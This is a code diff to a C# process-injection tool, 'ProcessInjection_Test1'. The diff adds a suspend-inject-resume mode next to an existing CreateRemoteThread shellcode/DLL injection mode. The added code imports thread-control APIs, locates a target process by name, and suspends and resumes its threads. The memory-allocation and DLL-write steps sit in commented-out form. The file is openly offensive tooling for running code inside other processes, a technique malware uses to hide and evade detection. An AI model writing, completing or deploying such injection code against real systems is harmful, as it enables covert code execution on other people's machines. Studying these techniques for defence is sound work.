@@ -57,6 +57,32 @@ namespace ProcessInjection_Test1
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        // Suspend, Inject, Resume Specific Inports
+        // These imports are specific to the SIR process
+        [Flags]
+        public enum ThreadAccess : int
+        {
+            TERMINATE = (0x0001),
+            SUSPEND_RESUME = (0x0002),
+            GET_CONTEXT = (0x0008),
+            SET_CONTEXT = (0x0010),
+            SET_INFORMATION = (0x0020),
+            QUERY_INFORMATION = (0x0040),
+            SET_THREAD_TOKEN = (0x0080),
+            IMPERSONATE = (0x0100),
+            DIRECT_IMPERSONATION = (0x0200)
+        }
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+        [DllImport("kernel32.dll")]
+        static extern uint SuspendThread(IntPtr hThread);
+        [DllImport("kernel32.dll")]
+        static extern int ResumeThread(IntPtr hThread);
+        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool CloseHandle(IntPtr handle);
+
+
+
         //[DllImport("kernel32")]
         //static extern IntPtr CreateFileA(string lpFileName, int dwDesiredAccess, int dwShareMode, int lpSecurityAttributes, int dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);
 
@@ -84,7 +110,7 @@ namespace ProcessInjection_Test1
 
             if (args[2] == "crt")
             {
-                Console.WriteLine("[!] Injecting with CreateRemoteThread()");
+                Console.WriteLine("[!] Injecting via CreateRemoteThread()");
                 Console.WriteLine("[+] Shellcode [1] or DLL Path [2]?");
                 string path = Console.ReadLine();
                
@@ -98,7 +124,25 @@ namespace ProcessInjection_Test1
                     Console.WriteLine("[!] Injecting DLL Path");
                     crt_Injection(processName, true);
                 }
-            }            
+            }
+            if (args[2] == "sir")
+            {
+                Console.WriteLine("[!] Injecting via Suspend, Inject, Resume");
+                Console.WriteLine("[+] Shellcode [1] or DLL Path [2]?");
+                string path = Console.ReadLine();
+
+                if (path == "1")
+                {
+                    Console.WriteLine("[!] Injecting shellcode");
+                    sir_Injection(processName, false);
+                }
+                if (path == "2")
+                {
+                    Console.WriteLine("[!] Injecting DLL Path");
+                    sir_Injection(processName, true);
+                }
+            }
+            
             return;
         }
 
@@ -176,21 +220,72 @@ namespace ProcessInjection_Test1
         }
 
         // SIR Injection
-        static void sir_injection(Process pName)
+        static void sir_Injection(string processName, bool path)
         {
-            // OpenProcess?
             // SuspendThread
+            // OpenProcess (For DLL)
             // VirtualAllocEx
+            // LoadLibraryA (For DLL)
             // WriteProcessMemory
             // PTHREAD_START_ROUTINE
             // QueueUserAPC
             // ResumeThread
 
+            Console.WriteLine("[+] Attempting to find " + processName);
+            Process proc = Process.GetProcessesByName(processName)[0];
 
             // Suspend process and threads
             // https://stackoverflow.com/questions/71257/suspend-process-in-c-sharp
-            var proc = Process.GetProcessById(pName.Id);
 
+            Console.WriteLine("[+] Process has " + proc.Threads.Count + " threads, attempting to suspend them");
+
+            foreach (ProcessThread pT in proc.Threads)
+            {
+                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);
+                
+                if (pOpenThread == IntPtr.Zero)
+                {
+                    continue;
+                }
+
+                SuspendThread(pOpenThread);
+                CloseHandle(pOpenThread);
+            }
+
+
+
+
+
+
+            // Obtain a handle to the target process
+            //IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
+            //Console.WriteLine("[+] Got Handle: " + procHandle.ToString("X4"));
+
+            // Check if we're injecting shellcode or DLL
+            // Follows similar process as CRT
+            // Execution is handled differently
+            //if (path)
+            //{
+            //    // Get the address of LoadLibraryA
+            //    IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            //    Console.WriteLine("[+] Got LoadLibraryA Address: 0x" + loadLibrary_Address.ToString("X4"));
+
+            //    // Now, we allocate some memory within the target process that we'll use for writing
+            //    IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            //    Console.WriteLine("[+] Memory Allocated @ 0x" + virtualAllocMemAddress.ToString("X4"));
+
+            //    // Here we write the path to the DLL we're injecting into the memory of the target process, using the address we saved when calling VirtualAllocEx
+            //    UIntPtr bytesWritten;
+            //    byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);
+            //    bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
+
+
+            //}
+
+
+
+            // Finally, resume the process
+            Console.WriteLine("[+] Resuming process...");
             foreach (ProcessThread pT in proc.Threads)
             {
                 IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);
@@ -200,9 +295,14 @@ namespace ProcessInjection_Test1
                     continue;
                 }
 
-                SuspendThread(pOpenThread);
+                var suspendCount = 0;
+                do
+                {
+                    suspendCount = ResumeThread(pOpenThread);
+                } while (suspendCount > 0);
 
                 CloseHandle(pOpenThread);
+                Console.WriteLine("[+] Process resumed!");
             }
 
         }
